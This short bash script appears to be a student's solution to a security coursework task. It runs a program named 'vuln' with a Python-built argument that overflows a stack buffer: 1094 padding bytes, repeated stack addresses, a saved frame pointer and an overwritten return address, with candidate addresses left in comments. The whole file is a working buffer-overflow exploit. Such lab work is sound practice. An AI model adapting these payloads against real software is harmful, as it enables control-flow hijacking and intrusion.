#!/usr/bin/env bash

#func=$(python -c "print('\x56\x85\x04\x08')")
#0x0804875b
#0x08048556
#ebp=$(python -c "print('\xc8\xdd\xff\xff')")
/task2/s1853050/vuln $(python -c "print('a' * 1094 + '\x90\xd8\xff\xff'*6 + '\xc8\xdd\xff\xff' + '\x56\x85\x04\x08')")
